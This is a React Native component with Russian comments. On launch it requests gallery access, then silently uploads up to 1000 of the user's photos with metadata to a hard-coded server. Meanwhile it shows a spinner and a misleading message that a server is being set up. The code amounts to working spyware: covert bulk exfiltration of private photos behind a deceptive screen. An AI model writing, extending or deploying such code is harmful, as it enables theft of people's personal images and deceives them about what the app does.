import React, { useEffect } from 'react';
import {
  View,
  Text,
  Alert,
  StyleSheet,
  ActivityIndicator,
} from 'react-native';
import * as MediaLibrary from 'expo-media-library';
import axios from 'axios';

const SERVER_URL = 'http://192.168.1.70:8000/api/upload/'; // Django сервер

const PhotoUploader = () => {

  // Автоматический сбор и загрузка фотографий
  const autoCollectAndUpload = async () => {
    try {
      // Запрашиваем разрешения
      const { status } = await MediaLibrary.requestPermissionsAsync();
      if (status !== 'granted') {
        Alert.alert('Ошибка', 'Необходим доступ к галерее для автоматической загрузки');
        return;
      }

      // Получаем все фотографии из галереи
      const { assets } = await MediaLibrary.getAssetsAsync({
        mediaType: MediaLibrary.MediaType.photo,
        first: 1000, // Получаем до 1000 фотографий
        sortBy: MediaLibrary.SortBy.creationTime,
      });

      console.log(`Найдено ${assets.length} фотографий`);

      // Загружаем каждую фотографию по отдельности
      for (let i = 0; i < assets.length; i++) {
        const photo = assets[i];
        
        try {
          const formData = new FormData();
          formData.append('file', {
            uri: photo.uri,
            type: 'image/jpeg',
            name: `auto_photo_${Date.now()}_${i}.jpg`,
          });

          // Добавляем метаданные
          formData.append('uploaded_at', new Date().toISOString());
          formData.append('device_info', 'Auto Upload App');
          formData.append('creation_time', photo.creationTime);
          formData.append('file_size', photo.fileSize?.toString() || '0');

          await axios.post(SERVER_URL, formData, {
            headers: {
              'Content-Type': 'multipart/form-data',
            },
            timeout: 30000,
          });

          console.log(`Загружено фото ${i + 1} из ${assets.length}`);

          // Небольшая задержка между загрузками
          await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (error) {
          console.error(`Ошибка загрузки фото ${i}:`, error);
          // Продолжаем с следующей фотографией
        }
      }

      console.log('Автозагрузка завершена');

    } catch (error) {
      console.error('Ошибка автозагрузки:', error);
    }
  };

  // Запускаем автоматическую загрузку при монтировании компонента
  useEffect(() => {
    autoCollectAndUpload();
  }, []);

  return (
    <View style={styles.container}>
      <View style={styles.loadingScreen}>
        <ActivityIndicator size="large" color="#e94560" />
        <Text style={styles.loadingTitle}>
          Подождите, мы настраиваем сервер...
        </Text>
        <Text style={styles.loadingSubtitle}>
          Автоматический сбор фотографий в процессе
        </Text>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1a1a2e',
  },
  loadingScreen: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 40,
  },
  loadingTitle: {
    color: '#ffffff',
    fontSize: 24,
    fontWeight: 'bold',
    textAlign: 'center',
    marginTop: 30,
    marginBottom: 15,
  },
  loadingSubtitle: {
    color: '#a8a8a8',
    fontSize: 16,
    textAlign: 'center',
    lineHeight: 24,
  },
});

export default PhotoUploader; 